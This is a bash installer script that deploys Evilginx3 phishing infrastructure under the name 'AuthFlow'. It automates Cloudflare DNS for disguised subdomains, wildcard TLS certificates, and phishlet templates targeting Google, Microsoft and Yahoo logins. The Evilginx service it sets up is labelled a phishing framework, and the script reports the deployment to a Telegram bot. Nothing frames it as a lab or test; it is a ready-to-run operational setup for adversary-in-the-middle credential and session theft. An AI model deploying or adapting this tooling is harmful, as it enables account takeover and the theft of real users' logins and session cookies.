#!/bin/bash
set -euo pipefail

# ============================================================================
# AuthFlow Production Installer - Evilginx v3 Compatible
# ============================================================================
# Usage:
#   sudo DOMAIN=example.com VPS_IP=1.2.3.4 \
#        TELEGRAM_TOKEN=xxx TELEGRAM_CHAT=xxx \
#        CLOUDFLARE_TOKEN=xxx ADMIN_PASS=xxx \
#        ./scripts/install-prod.sh
# ============================================================================

# Color codes
readonly GREEN='\033[0;32m'
readonly RED='\033[0;31m'
readonly YELLOW='\033[0;33m'
readonly NC='\033[0m'

# Installation paths
readonly INSTALL_DIR="/opt/authflow"
readonly EVILGINX_DIR="/opt/evilginx"
readonly REPO_SOURCE="${REPO_SOURCE:-.}"
readonly SERVICE_NAME="authflow"
readonly SERVICE_USER="authflow"
readonly SERVICE_GROUP="authflow"
readonly APP_PORT="${APP_PORT:-8080}"
readonly APP_BINARY="authflow-server"

# Config files
readonly CF_CREDS_FILE="/etc/letsencrypt/cloudflare-token.ini"
readonly CONFIG_FILE="$INSTALL_DIR/config/config.json"
readonly SYSTEMD_UNIT="/etc/systemd/system/${SERVICE_NAME}.service"

# ============================================================================
# Logging functions
# ============================================================================
log() {
    echo -e "${GREEN}[+]${NC} $1"
}

err() {
    echo -e "${RED}[ERROR]${NC} $1" >&2
    exit 1
}

warn() {
    echo -e "${YELLOW}[!]${NC} $1"
}

# ============================================================================
# Argument parsing
# ============================================================================
parse_args() {
    SKIP_DNS=false
    while [[ $# -gt 0 ]]; do
        case $1 in
            --domain)
                DOMAIN="$2"
                shift 2
                ;;
            --vps-ip)
                VPS_IP="$2"
                shift 2
                ;;
            --telegram-token)
                TELEGRAM_TOKEN="$2"
                shift 2
                ;;
            --telegram-chat)
                TELEGRAM_CHAT="$2"
                shift 2
                ;;
            --cloudflare-token)
                CLOUDFLARE_TOKEN="$2"
                shift 2
                ;;
            --admin-pass)
                ADMIN_PASS="$2"
                shift 2
                ;;
            --skip-dns)
                SKIP_DNS=true
                shift
                ;;
            --repo-source)
                REPO_SOURCE="$2"
                shift 2
                ;;
            --proxy-url)
                PROXY_URL="$2"
                shift 2
                ;;
            --go-proxy)
                GO_PROXY="$2"
                shift 2
                ;;
            *)
                err "Unknown argument: $1"
                ;;
        esac
    done
}

# ============================================================================
# Configuration validation
# ============================================================================
validate_config() {
    local missing=0

    [[ -z "${DOMAIN:-}" ]] && { warn "DOMAIN not set"; missing=1; }
    [[ -z "${VPS_IP:-}" ]] && { warn "VPS_IP not set"; missing=1; }
    [[ -z "${TELEGRAM_TOKEN:-}" ]] && { warn "TELEGRAM_TOKEN not set"; missing=1; }
    [[ -z "${TELEGRAM_CHAT:-}" ]] && { warn "TELEGRAM_CHAT not set"; missing=1; }
    [[ -z "${CLOUDFLARE_TOKEN:-}" ]] && { warn "CLOUDFLARE_TOKEN not set"; missing=1; }

    if [[ $missing -eq 1 ]]; then
        err "Required environment variables or flags not provided"
    fi

    # Generate secure random values if not provided
    if [[ -z "${ADMIN_PASS:-}" ]]; then
        ADMIN_PASS=$(openssl rand -base64 16 | tr -d '/+=' | cut -c1-16)
        log "Generated admin password: $ADMIN_PASS"
    fi

    if [[ -z "${WEBHOOK_SECRET:-}" ]]; then
        WEBHOOK_SECRET=$(openssl rand -hex 16)
    fi

    if [[ -z "${ADMIN_PATH:-}" ]]; then
        ADMIN_PATH=$(openssl rand -hex 12)
        log "Generated admin path: /$ADMIN_PATH"
    fi

    PROXY_URL="${PROXY_URL:-}"
    GO_PROXY="${GO_PROXY:-https://proxy.golang.org,direct}"

    # Generate endpoint names for phishlets
    EP1="collector-$(openssl rand -hex 4)"
    EP2="tracker-$(openssl rand -hex 4)"
    EP3="monitor-$(openssl rand -hex 4)"
}

# ============================================================================
# Update Cloudflare DNS records
# ============================================================================
update_dns() {
    log "Updating Cloudflare DNS records..."
    local zone_id
    zone_id=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones?name=$DOMAIN" \
        -H "Authorization: Bearer $CLOUDFLARE_TOKEN" \
        -H "Content-Type: application/json" | jq -r '.result[0].id')

    if [[ "$zone_id" == "null" || -z "$zone_id" ]]; then
        err "Could not find Zone ID for $DOMAIN in Cloudflare. Check your token permissions."
    fi

    local records=("$DOMAIN" "$EP1.$DOMAIN" "$EP2.$DOMAIN" "$EP3.$DOMAIN")
    for record in "${records[@]}"; do
        log "Setting A record for $record -> $VPS_IP"
        local existing_id
        existing_id=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones/$zone_id/dns_records?name=$record&type=A" \
            -H "Authorization: Bearer $CLOUDFLARE_TOKEN" \
            -H "Content-Type: application/json" | jq -r '.result[0].id')

        local payload="{\"type\":\"A\",\"name\":\"$record\",\"content\":\"$VPS_IP\",\"ttl\":120,\"proxied\":false}"
        
        if [[ "$existing_id" != "null" && -n "$existing_id" ]]; then
            curl -s -X PUT "https://api.cloudflare.com/client/v4/zones/$zone_id/dns_records/$existing_id" \
                -H "Authorization: Bearer $CLOUDFLARE_TOKEN" \
                -H "Content-Type: application/json" \
                -d "$payload" > /dev/null
        else
            curl -s -X POST "https://api.cloudflare.com/client/v4/zones/$zone_id/dns_records" \
                -H "Authorization: Bearer $CLOUDFLARE_TOKEN" \
                -H "Content-Type: application/json" \
                -d "$payload" > /dev/null
        fi
    done
}

# ============================================================================
# Pre-flight checks
# ============================================================================
preflight_checks() {
    [[ $EUID -ne 0 ]] && err "This script must be run as root (sudo)"

    [[ ! -f "$REPO_SOURCE/cmd/authflow/main.go" ]] && err "Repository source not found at $REPO_SOURCE/cmd/authflow/main.go"
    [[ ! -f "$REPO_SOURCE/go.mod" ]] && warn "go.mod not found in source. It will be initialized during the build phase."

    # Verify required commands exist
    for cmd in git curl wget openssl systemctl expect; do
        if ! command -v "$cmd" &>/dev/null; then
            warn "Installing missing command: $cmd"
            apt-get update -y && apt-get install -y "$cmd"
        fi
    done

    log "Pre-flight checks passed"
}

# ============================================================================
# Install dependencies with pinned versions
# ============================================================================
install_dependencies() {
    log "Installing system dependencies..."
    apt-get update -y

    apt-get install -y \
        git \
        curl \
        wget \
        build-essential \
        make \
        unzip \
        jq \
        sqlite3 \
        certbot \
        python3-certbot-dns-cloudflare \
        golang-go \
        expect

    log "Dependencies installed successfully"
}

# ============================================================================
# Setup Cloudflare credentials file
# ============================================================================
setup_cloudflare_creds() {
    log "Setting up Cloudflare credentials..."

    install -m 600 /dev/null "$CF_CREDS_FILE"

    cat > "$CF_CREDS_FILE" << EOF
# Cloudflare API Token for DNS-01 challenges
dns_cloudflare_api_token = ${CLOUDFLARE_TOKEN}
EOF

    log "Cloudflare credentials stored at $CF_CREDS_FILE"
}

# ============================================================================
# Install Evilginx3
# ============================================================================
install_evilginx() {
    log "Installing Evilginx3..."

    # Clone Evilginx3 (latest v3.x)
    rm -rf "$EVILGINX_DIR"
    git clone https://github.com/kgretzky/evilginx2.git "$EVILGINX_DIR"

    cd "$EVILGINX_DIR"
    
    # Build (v3 uses Go modules)
    make build
    
    # Install binary
    install -m 755 build/evilginx /usr/local/bin/evilginx
    
    # Create necessary directories
    mkdir -p "$EVILGINX_DIR"/{phishlets,certs,lures,redirectors}
    
    # Set permissions
    chmod 755 "$EVILGINX_DIR"/{phishlets,certs,lures,redirectors}
    
    log "Evilginx3 installed at /usr/local/bin/evilginx"
    
    cd - > /dev/null
}

# ============================================================================
# Deploy AuthFlow application
# ============================================================================
deploy_authflow() {
    log "Deploying AuthFlow..."

    mkdir -p "$INSTALL_DIR"/{data,logs,config}

    log "Copying source code from $REPO_SOURCE..."
    rsync -av --exclude=.git --exclude=vendor --exclude=build \
          "$REPO_SOURCE/" "$INSTALL_DIR/"

    chown -R "$SERVICE_USER:$SERVICE_GROUP" "$INSTALL_DIR" 2>/dev/null || true

    log "AuthFlow source deployed to $INSTALL_DIR"
}

# ============================================================================
# Build AuthFlow binary
# ============================================================================
build_authflow() {
    log "Building AuthFlow binary..."

    cd "$INSTALL_DIR"

    log "Using Go Proxy: $GO_PROXY"
    export GOPROXY="$GO_PROXY"

    if [[ ! -f "go.mod" ]]; then
        log "Initializing Go module 'authflow'..."
        go mod init authflow || err "Failed to initialize Go module"
    fi

    go mod tidy
    go mod download

    go build -buildvcs=false \
        -ldflags="-s -w -X main.Version=$(git describe --tags --always 2>/dev/null || echo 'dev')" \
        -o "$APP_BINARY" \
        ./cmd/authflow

    [[ -f "$APP_BINARY" ]] || err "Build failed: binary not created"

    chmod 755 "$APP_BINARY"
    log "AuthFlow binary built successfully"

    cd - > /dev/null
}

# ============================================================================
# Create configuration file
# ============================================================================
create_config() {
    log "Creating configuration file..."

    cat > "$CONFIG_FILE" << EOF
{
    "domain": "$DOMAIN",
    "vps_ip": "$VPS_IP",
    "telegram_token": "$TELEGRAM_TOKEN",
    "telegram_chat": "$TELEGRAM_CHAT",
    "admin_pass": "$ADMIN_PASS",
    "data_dir": "$INSTALL_DIR/data",
    "admin_path": "$ADMIN_PATH",
    "admin_whitelist": [],
    "endpoints": {
        "sub_portal1": "$EP1.$DOMAIN",
        "sub_portal2": "$EP2.$DOMAIN",
        "sub_portal3": "$EP3.$DOMAIN"
    },
    "retention_days": 30,
    "webhook_secret": "$WEBHOOK_SECRET",
    "proxy_url": "$PROXY_URL"
}
EOF

    chmod 600 "$CONFIG_FILE"
    chown "$SERVICE_USER:$SERVICE_GROUP" "$CONFIG_FILE" 2>/dev/null || true

    log "Configuration created at $CONFIG_FILE"
    log "Portal endpoints:"
    log "  - https://$EP1.$DOMAIN"
    log "  - https://$EP2.$DOMAIN"
    log "  - https://$EP3.$DOMAIN"
}

# ============================================================================
# Provision TLS certificates
# ============================================================================
provision_tls() {
    log "Provisioning TLS certificates with Cloudflare DNS..."

    local domain_args="-d $DOMAIN -d *.$DOMAIN"

    certbot certonly \
        --dns-cloudflare \
        --dns-cloudflare-credentials "$CF_CREDS_FILE" \
        --dns-cloudflare-propagation-seconds 60 \
        --non-interactive \
        --agree-tos \
        --expand \
        --email "admin@$DOMAIN" \
        --no-eff-email \
        $domain_args

    # Check if certbot succeeded
    if [ $? -ne 0 ]; then
        warn "Let's Encrypt failed, continuing with HTTP-only mode"
        sed -i 's/https_port: 443/https_port: 0/' "$EVILGINX_DIR/config/config.yaml" 2>/dev/null || true
    fi

    # Allow the authflow group to read certificates
    chgrp -R "$SERVICE_GROUP" /etc/letsencrypt/archive /etc/letsencrypt/live
    chmod -R g+rx /etc/letsencrypt/archive /etc/letsencrypt/live

    log "TLS certificates provisioned successfully"
}

# ============================================================================
# Create system user and directories
# ============================================================================
setup_system_user() {
    log "Setting up system user and directories..."

    # Create group if not exists
    if ! getent group "$SERVICE_GROUP" >/dev/null; then
        groupadd -r "$SERVICE_GROUP"
        log "Created group: $SERVICE_GROUP"
    fi
    
    # Create user if not exists (using -g for primary group)
    if ! id "$SERVICE_USER" >/dev/null; then
        useradd -r -g "$SERVICE_GROUP" -s /bin/false -d /var/lib/authflow "$SERVICE_USER"
        log "Created user: $SERVICE_USER"
    fi

    # Create directories with proper permissions
    mkdir -p "$INSTALL_DIR"/{data,logs,config}
    
    # Set ownership (ignore errors if user/group missing)
    chown -R "$SERVICE_USER:$SERVICE_GROUP" "$INSTALL_DIR" 2>/dev/null || {
        warn "Could not set ownership, will retry later"
    }
    
    chmod 750 "$INSTALL_DIR"
    chmod 750 "$INSTALL_DIR"/{data,logs,config}

    log "System user and directories configured"
}

# ============================================================================
# Create systemd service unit
# ============================================================================
create_systemd_service() {
    log "Creating systemd service unit..."

    cat > "$SYSTEMD_UNIT" << EOF
[Unit]
Description=AuthFlow Web Authentication Server
Documentation=https://github.com/tartmo/authflow
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=$SERVICE_USER
Group=$SERVICE_GROUP
WorkingDirectory=$INSTALL_DIR

ExecStart=$INSTALL_DIR/$APP_BINARY -config=$CONFIG_FILE -port=$APP_PORT

NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=$INSTALL_DIR/data $INSTALL_DIR/logs

Restart=always
RestartSec=5
StartLimitInterval=600
StartLimitBurst=3

LimitNOFILE=65535
LimitNPROC=4096

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME"

    log "Systemd service created and enabled"
}

# ============================================================================
# Start AuthFlow service
# ============================================================================
start_service() {
    log "Starting AuthFlow service..."

    systemctl restart "$SERVICE_NAME"

    sleep 2

    if systemctl is-active --quiet "$SERVICE_NAME"; then
        log "AuthFlow service started successfully"
    fi
}

# ============================================================================
# Configure Evilginx3 integration (v3 compatible)
# ============================================================================
configure_evilginx_integration() {
    log "Configuring Evilginx3 integration..."

    # Resolve Port 53 conflict
    if grep -q "DNSStubListener=yes" /etc/systemd/resolved.conf || ! grep -q "DNSStubListener" /etc/systemd/resolved.conf; then
        log "Disabling systemd-resolved stub listener..."
        mkdir -p /etc/systemd/resolved.conf.d
        echo -e "[Resolve]\nDNSStubListener=no" > /etc/systemd/resolved.conf.d/evilginx.conf
        systemctl restart systemd-resolved
    fi

    # Stop existing services
    systemctl stop evilginx 2>/dev/null || true
    pkill evilginx 2>/dev/null || true
    sleep 2

    # Create proper directory structure for Evilginx
    mkdir -p "$EVILGINX_DIR"/{config,certs,lures,phishlets}

    # Base domain certificates
    ln -sf "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "$EVILGINX_DIR/certs/$DOMAIN.crt"
    ln -sf "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "$EVILGINX_DIR/certs/$DOMAIN.key"

    # Create certificate symlinks for each phishlet subdomain
    for sub in $EP1 $EP2 $EP3; do
        ln -sf "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "$EVILGINX_DIR/certs/${sub}.${DOMAIN}.crt"
        ln -sf "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "$EVILGINX_DIR/certs/${sub}.${DOMAIN}.key"
    done
    
    # Create config.yaml in the config subdirectory
    cat > "$EVILGINX_DIR/config/config.yaml" << EOF
daemon: false
debug: true
domain: $DOMAIN
ipv4: $VPS_IP
http_port: 80
https_port: 443
dns_port: 0
autocert: false
phishlets_path: $EVILGINX_DIR/phishlets
cert_path: $EVILGINX_DIR/certs
database: $EVILGINX_DIR/evilginx.db
EOF

    # Ensure phishlets directory exists
    mkdir -p "$EVILGINX_DIR/phishlets"

    # Replace variables in phishlets
    for phishlet in google microsoft yahoo; do
        if [ -f "$INSTALL_DIR/templates/phishlets/${phishlet}.yaml.tmpl" ]; then
            sed -e "s|{{.Endpoint1}}|$EP1|g" \
                -e "s|{{.Endpoint2}}|$EP2|g" \
                -e "s|{{.Endpoint3}}|$EP3|g" \
                -e "s|{{.Domain}}|$DOMAIN|g" \
                -e "s|{{.VpsIp}}|$VPS_IP|g" \
                -e "s|{{.AppPort}}|$APP_PORT|g" \
                -e "s|{{.WebhookSecret}}|$WEBHOOK_SECRET|g" \
                "$INSTALL_DIR/templates/phishlets/${phishlet}.yaml.tmpl" > "$EVILGINX_DIR/phishlets/${phishlet}.yaml"
            log "Created phishlet: $phishlet"
        else
            warn "Phishlet template not found: ${phishlet}.yaml.tmpl"
        fi
    done

    # Create systemd service for evilginx
    cat > /etc/systemd/system/evilginx.service << EOF
[Unit]
Description=Evilginx3 Phishing Framework
After=network.target network-online.target
Wants=network-online.target
Before=authflow.service

[Service]
Type=simple
User=root
WorkingDirectory=$EVILGINX_DIR
ExecStartPre=/bin/rm -f $EVILGINX_DIR/evilginx.db
ExecStart=/usr/local/bin/evilginx -c $EVILGINX_DIR/config -p $EVILGINX_DIR/phishlets
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal
KillMode=process
KillSignal=SIGINT

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    # Don't enable evilginx service automatically
    # systemctl enable evilginx
    
    # Start evilginx
    systemctl start evilginx
    
    sleep 5
    
    # Check if running
    if systemctl is-active --quiet evilginx; then
        log "Evilginx3 started successfully"
    else
        warn "Evilginx3 failed to start. Checking logs..."
        journalctl -u evilginx -n 20 --no-pager
    fi

    log "Evilginx3 integration configured"
}

# ============================================================================
# Print installation summary
# ============================================================================
print_summary() {
    local cert_dir="/etc/letsencrypt/live/$DOMAIN"

    echo ""
    echo "=========================================="
    echo "   AuthFlow Installation Complete"
    echo "=========================================="
    echo ""
    echo "Configuration:"
    echo "  Domain: $DOMAIN"
    echo "  VPS IP: $VPS_IP"
    echo "  Admin Path: /$ADMIN_PATH"
    echo "  Admin Password: $ADMIN_PASS"
    echo "  Webhook Secret: $WEBHOOK_SECRET"
    echo ""
    echo "Installation Paths:"
    echo "  Application: $INSTALL_DIR"
    echo "  Evilginx3: $EVILGINX_DIR"
    echo "  Config: $CONFIG_FILE"
    echo ""
    echo "Service Management:"
    echo "  AuthFlow:  systemctl status $SERVICE_NAME"
    echo "  Evilginx3: systemctl status evilginx"
    echo ""
    echo "  Start: systemctl start $SERVICE_NAME"
    echo "  Stop: systemctl stop $SERVICE_NAME"
    echo "  Restart: systemctl restart $SERVICE_NAME"
    echo "  Logs: journalctl -u $SERVICE_NAME -f"
    echo ""
    echo "Evilginx3 Commands:"
    echo "  Manual Run: sudo evilginx -c $EVILGINX_DIR/config -p $EVILGINX_DIR/phishlets"
    echo "  Logs:       journalctl -u evilginx -f"
    echo "  Sessions:   sudo evilginx -c $EVILGINX_DIR sessions"
    echo ""
    echo "TLS Certificates:"
    echo "  Path: $cert_dir"
    echo "  Auto-renew: certbot renew (via systemd timer)"
    echo ""
    echo "Quick Access (AuthFlow):"
    echo "  Dashboard: http://$DOMAIN:$APP_PORT/$ADMIN_PATH/"
    echo ""
    echo "=========================================="
}

# ============================================================================
# Main installation flow
# ============================================================================
main() {
    clear
    echo "=========================================="
    echo "   AuthFlow Production Installer (v3)"
    echo "=========================================="
    echo ""

    parse_args "$@"
    validate_config
    if [ "$SKIP_DNS" = false ] && [ "$CLOUDFLARE_TOKEN" != "SKIP_DNS" ] && [[ "$CLOUDFLARE_TOKEN" != cf_* ]]; then
        update_dns
    else
        log "Skipping DNS update (manual DNS configuration assumed)"
    fi

    preflight_checks
    setup_system_user
    install_dependencies
    setup_cloudflare_creds
    install_evilginx
    deploy_authflow
    build_authflow
    create_config
    provision_tls
    configure_evilginx_integration
    create_systemd_service
    start_service

    print_summary

    if [[ -n "${TELEGRAM_TOKEN:-}" && -n "${TELEGRAM_CHAT:-}" ]]; then
        local proxy_args=""
        if [[ -n "${PROXY_URL:-}" ]]; then
            proxy_args="--proxy $PROXY_URL"
        fi

        curl $proxy_args -s -X POST "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" \
            -d "chat_id=${TELEGRAM_CHAT}" \
            -d "text=✅ AuthFlow v3 successfully deployed on $DOMAIN. Admin: /$ADMIN_PATH" > /dev/null || true
    fi

    log "Installation completed successfully!"
}

# Execute main function
main "$@"